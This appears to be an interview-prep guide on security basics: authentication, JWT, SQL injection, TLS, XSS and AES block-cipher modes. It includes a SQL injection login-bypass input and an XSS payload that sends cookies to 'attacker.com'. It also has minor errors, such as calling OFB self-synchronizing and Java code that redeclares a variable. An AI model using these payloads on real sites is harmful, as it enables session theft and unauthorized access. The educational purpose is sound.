# 🔒 Security Fundamentals — Interview Questions (Service-Based Companies)

This document covers security concepts commonly tested at service-based companies like TCS, Infosys, Wipro, Capgemini, HCL. Targeted at 1–5 years of experience rounds.

---

### Q1: What is the difference between Authentication and Authorization?

**Answer:**

| | Authentication | Authorization |
|---|---|---|
| Question | "Who are you?" | "What are you allowed to do?" |
| What it verifies | Identity | Permissions/Access rights |
| When it happens | First — must authenticate before authorizing | Second — after identity confirmed |
| Example (hotel) | Show ID at check-in → get room key | Room key only opens YOUR room, not others |
| Example (app) | Login with username/password → issued JWT | JWT checked for `admin` role before deleting user |
| HTTP status | 401 Unauthorized | 403 Forbidden |
| Protocols | OAuth2, OIDC, SAML, JWT | RBAC, ABAC, ACL |

**Common interview trick:** HTTP 401 is actually "Unauthenticated" — you haven't proved who you are. 403 is "Unauthorized" — we know who you are, but you don't have permission.

---

### Q2: What is JWT (JSON Web Token)? How does it work?

**Answer:**
**JWT** is a compact, self-contained token format for securely transmitting information between parties as a JSON object. It is digitally signed, so it can be verified.

**Structure:** 3 parts separated by dots: `header.payload.signature`

**Header** (Base64URL encoded JSON):
```json
{ "alg": "HS256", "typ": "JWT" }
```

**Payload** (Base64URL encoded JSON — the claims):
```json
{
  "sub": "user_id_42",
  "name": "John Doe",
  "role": "admin",
  "iat": 1708000000,
  "exp": 1708003600
}
```

**Signature:**
```
HMAC-SHA256(Base64URL(header) + "." + Base64URL(payload), secret_key)
```

**How JWT-based auth works:**
1. User logs in with credentials.
2. Server validates, creates JWT signed with secret key, sends to client.
3. Client stores JWT (localStorage or httpOnly cookie).
4. Client sends JWT in `Authorization: Bearer <token>` header on each request.
5. Server validates signature → if valid, trusts the claims (no DB lookup needed!).

**JWT advantages:** Stateless — server doesn't need to store sessions. Scales horizontally.

**JWT disadvantages:** Cannot be invalidated before expiry (logout is hard). Keep expiry short (15-60 min). Use refresh tokens for long sessions.

---

### Q3: What is SQL Injection? How do you prevent it?

**Answer:**
**SQL Injection** is an attack where malicious SQL code is inserted into a query through user input, changing the query's intent.

**Vulnerable code:**
```java
// DANGEROUS — user input directly concatenated into SQL
String sql = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

**Attack:** Enter username: `admin' --`
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
-- The '--' comments out the password check → logs in as admin without password!
```

**Prevention:**

**1. Parameterized Queries (Prepared Statements) — PRIMARY solution:**
```java
// Safe — parameter binding, not concatenation
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?"
);
stmt.setString(1, username);
stmt.setString(2, password);
```
Parameters are sent separately — the database treats them as data, not code.

**2. ORM Frameworks:**
JPA/Hibernate, Spring Data — use prepared statements internally. Avoid native queries with string concatenation.

**3. Input Validation:**
Whitelist expected formats (usernames: only alphanumeric). But this is a defense-in-depth, NOT a replacement for parameterized queries.

**4. Least Privilege:**
DB user used by the application should only have SELECT/INSERT/UPDATE on needed tables. Not CREATE TABLE, DROP, or admin rights.

**5. WAF (Web Application Firewall):**
Can detect and block common SQL injection patterns. Additional layer of defense.

---

### Q4: What is HTTPS and how does TLS work?

**Answer:**
**HTTPS** = HTTP + TLS (Transport Layer Security). TLS provides encryption, authentication, and data integrity.

**TLS 1.3 Handshake (simplified):**

```
Client                                    Server
  │                                          │
  │──── ClientHello (supported TLS versions, ────►
  │     cipher suites, random nonce)         │
  │                                          │
  │◄─── ServerHello (chosen cipher, server  ────
  │     certificate, server random, key share)│
  │                                          │
  │ [Client verifies certificate with CA]    │
  │ [Both derive Session Keys]               │
  │                                          │
  │──── Finished (MAC of handshake messages) ────►
  │◄─── Finished                            ────
  │                                          │
  │  [Encrypted application data begins]    │
```

**Certificate verification:**
1. Server sends its digital certificate (contains public key + signed by CA).
2. Client checks certificate chain back to a trusted Root CA (stored in browser/OS).
3. Client verifies server's domain matches certificate's CN/SAN fields.
4. If all checks pass → server is authentic.

**Key types:**
- **Asymmetric (RSA/ECDSA)**: Used ONLY during handshake to authenticate and exchange keys.
- **Symmetric (AES-GCM)**: Used for actual data encryption (much faster).

---

### Q5: What is XSS (Cross-Site Scripting) and how do you prevent it?

**Answer:**
**XSS** is an attack where malicious scripts are injected into web pages viewed by other users, executing in the victim's browser.

**Example attack:**
```
Comment field input: <script>document.cookie → fetch('attacker.com/steal?c='+document.cookie)</script>
```
If stored and rendered without sanitization → every user who views that comment sends their cookies to the attacker.

**Types:**
- **Stored/Persistent XSS**: Malicious script is stored in DB and served to all users (most dangerous).
- **Reflected XSS**: Malicious input in URL parameter is reflected in response (no storage).
- **DOM-based XSS**: Client-side JavaScript modifies DOM unsafely.

**Prevention:**

**1. Output Encoding (PRIMARY solution):**
Encode all dynamic content before rendering in HTML context:
```html
<!-- Dangerous: -->
<p>Hello, {{username}}</p>

<!-- Safe (with encoding): -->
<p>Hello, {{username | htmlEscape}}</p>
<!-- <script> becomes &lt;script&gt; — not executed -->
```

**2. Content Security Policy (CSP) Header:**
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```
Tells browser to only execute scripts from your own domain.

**3. HttpOnly Cookies:**
```
Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict
```
`HttpOnly` → cookie not accessible via JavaScript → XSS can't steal cookies.

**4. Sanitization libraries:**
For rich-text input (user-generated HTML), use libraries like DOMPurify to strip dangerous tags.

---

### Q6: What is the difference between symmetric and asymmetric encryption?

**Answer:**

| | Symmetric | Asymmetric |
|---|---|---|
| Keys | Single shared secret key | Public key + Private key pair |
| Speed | Very fast | ~1000x slower |
| Key exchange | Problem: how to share secret securely? | Public key shared freely, private key kept secret |
| Use case | Bulk data encryption | Key exchange, digital signatures, certificate auth |
| Algorithms | AES-256, ChaCha20 | RSA-2048, ECDSA, ECDH |
| Example | Encrypting stored data, VPN tunnels | HTTPS handshake, JWT signing (RS256) |

**How HTTPS combines both:**
- Asymmetric used to **authenticate server** and **exchange a session key** securely.
- Symmetric used for **all actual data** (much faster for bulk transfer).
This is why TLS is both secure AND fast.

---

### Q7: What are the different encryption modes of operation? Explain with examples.

**Answer:**
Encryption modes define how to encrypt data larger than the block size using block ciphers like AES.

**Common Modes:**

| Mode | Description | Pros | Cons | Use Case |
|---|---|---|---|---|
| **ECB** (Electronic Codebook) | Each block encrypted independently | Simple, parallelizable | **Insecure** - identical blocks produce identical ciphertext | Never use in production |
| **CBC** (Cipher Block Chaining) | Each block XORed with previous ciphertext | Better security than ECB | Sequential (slow), needs padding | Legacy systems, disk encryption |
| **CFB** (Cipher Feedback) | Stream cipher mode, self-synchronizing | No padding needed, error recovery | Sequential | Network protocols |
| **OFB** (Output Feedback) | Stream cipher, prevents error propagation | No error propagation | Sequential | Audio/video streaming |
| **CTR** (Counter Mode) | Turns block cipher into stream cipher | Parallelizable, random access | Counter must never repeat | High-performance systems |
| **GCM** (Galois/Counter Mode) | CTR + authentication tag | **Authenticated encryption**, parallelizable | Complex implementation | **Modern standard** - TLS 1.3, APIs |

**Why GCM is preferred today:**
- Provides both confidentiality **and** integrity (authentication)
- Parallel encryption/decryption
- No padding required
- Resistant to many attacks

---

### Q8: What's wrong with ECB mode? Show with an example.

**Answer:**
ECB mode is **cryptographically insecure** because identical plaintext blocks produce identical ciphertext blocks, revealing patterns.

**Example - Encrypting an image with ECB:**
```
Original Image (with repeating patterns)
┌─────────────────────────────────────┐
│ ████    ████    ████    ████      │
│ ████    ████    ████    ████      │
│                                    │
│    ████    ████    ████    ████    │
│    ████    ████    ████    ████    │
└─────────────────────────────────────┘

After ECB Encryption (patterns still visible!)
┌─────────────────────────────────────┐
│ AAAA    BBBB    AAAA    BBBB      │
│ AAAA    BBBB    AAAA    BBBB      │
│                                    │
│    CCCC    DDDD    CCCC    DDDD    │
│    CCCC    DDDD    CCCC    DDDD    │
└─────────────────────────────────────┘

After CBC/GCM Encryption (no patterns)
┌─────────────────────────────────────┐
│ X#j@! k$Lm^ p&Q*r Z$n@t ...        │
│ (completely random-looking data)    │
└─────────────────────────────────────┘
```

**Real-world impact:**
- Encrypted ZIP files using ECB reveal file structure
- Database encryption with ECB reveals identical values
- **Never use ECB for anything serious**

---

### Q9: How do you choose the right encryption mode for your application?

**Answer:**

**Decision Framework:**

**For NEW applications (2024+):**
- **Always use GCM** - it's the modern standard
- Provides authenticated encryption (confidentiality + integrity)
- Supported by all major crypto libraries

**For HIGH-PERFORMANCE systems:**
- **CTR mode** - parallelizable, no authentication (add HMAC separately)
- Use when you need maximum speed and can handle integrity separately

**For LEGACY system compatibility:**
- **CBC mode** - widely supported but slower
- Must handle padding carefully (PKCS#7)
- Add HMAC for integrity

**For STREAMING data:**
- **OFB/CFB** - self-synchronizing
- Good for network protocols where packets may be lost

**NEVER use:**
- **ECB** - unless you're teaching crypto concepts

**Implementation Example (Java):**
```java
// Modern approach - GCM
SecretKey key = KeyGenerator.getInstance("AES").generateKey();
Cipher cipher = Cipher.getInstance("AES/GCM/NoPadding");
cipher.init(Cipher.ENCRYPT_MODE, key);
byte[] encrypted = cipher.doFinal(plaintext);

// Legacy approach - CBC with HMAC
Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
byte[] iv = new byte[16]; // Never reuse IV!
SecureRandom random = new SecureRandom();
random.nextBytes(iv);
cipher.init(Cipher.ENCRYPT_MODE, key, new IvParameterSpec(iv));
byte[] encrypted = cipher.doFinal(plaintext);
// Then calculate HMAC-SHA256 on encrypted + iv
```

---

*Prepared for technical screening at service-based companies (TCS, Infosys, Wipro, Capgemini, HCL, Cognizant, Tech Mahindra).*
